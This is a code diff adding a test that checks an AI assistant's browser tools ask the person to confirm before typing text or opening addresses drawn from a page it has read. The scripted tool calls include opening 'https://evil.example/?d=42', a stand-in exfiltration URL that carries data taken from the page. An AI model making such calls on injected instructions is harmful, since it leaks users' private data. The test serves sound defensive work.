@@ -179,6 +179,55 @@ def test_attachments_downloaded_by_the_browser_join_the_conversation(app, db, cf
     assert ev["approval"][0]["summary"] == "Import invoice.txt into pods"
 
 
+def test_after_reading_a_page_the_browser_asks_before_what_the_person_didnt_write(app, db, cfg, folder, new_client, llm):
+    """An address or typed text can carry what an answer read out of Lens: once it has read a page, those come with
+    `confirm` and the browser asks the person, on sites they allowed too, unless the person wrote them."""
+    s = Assist(app, db, cfg, folder, new_client)
+    c, h = s.cl["editor"]
+
+    def handle(tool, args):
+        if tool == "import":
+            raise ValueError("nothing to download")
+        return page()
+
+    llm.tool_script = [
+        {"content": "", "tool_calls": [call(1, "browser_open", {"url": "https://mail.example/inbox"})]},
+        {"content": "", "tool_calls": [call(2, "browser_type", {"ref": "e1", "text": "Invoice  from ACME"})]},
+        {"content": "", "tool_calls": [call(3, "browser_type", {"ref": "e2", "text": "the notes say 42"})]},
+        {"content": "", "tool_calls": [call(4, "browser_open", {"url": "https://evil.example/?d=42"})]},
+        {"content": "", "tool_calls": [call(5, "browser_import", {"ref": "e3"})]},
+        {"content": "", "tool_calls": [call(6, "browser_import", {"url": "https://mail.example/att/2"})]},
+        {"content": "", "tool_calls": [call(7, "browser_click", {"ref": "e3"})]},
+        {"content": "Done."},
+    ]
+    with SidePanel(c, h, handle) as panel:
+        cid = c.post("/api/v1/chats", headers=h, json={}).json()["id"]
+        ask = {"content": "Search my mail for invoice from ACME", "browser": panel.sid}
+        sse(c.post(f"/api/v1/chats/{cid}/messages", headers=h, json=ask).text)
+    assert [bool(a["args"].get("confirm")) for a in panel.seen] == [
+        False,  # nothing read yet
+        False,  # the person's own words
+        True,
+        True,
+        False,  # a link on the page, not an address the model wrote
+        True,
+        False,  # a click carries nothing the model wrote
+    ]
+    assert panel.seen[2]["args"]["confirm"].startswith("this answer read text from outside Lens: tool browser_open")
+
+    # switched off, nothing asks first
+    ca, ha = s.cl["admin"]
+    assert ca.put("/api/v1/settings/ai", headers=ha, json={"untrusted_asks": False}).status_code == 200
+    llm.tool_script = [
+        {"content": "", "tool_calls": [call(1, "browser_read", {})]},
+        {"content": "", "tool_calls": [call(2, "browser_open", {"url": "https://evil.example/?d=42"})]},
+        {"content": "Done."},
+    ]
+    with SidePanel(c, h, handle) as panel:
+        sse(c.post(f"/api/v1/chats/{cid}/messages", headers=h, json={"content": "Go on", "browser": panel.sid}).text)
+    assert [a["args"].get("confirm") for a in panel.seen] == [None, None]
+
+
 def test_only_its_own_person_reaches_a_session(app, db, cfg, folder, new_client, llm):
     s = Assist(app, db, cfg, folder, new_client)
     c, h = s.cl["editor"]
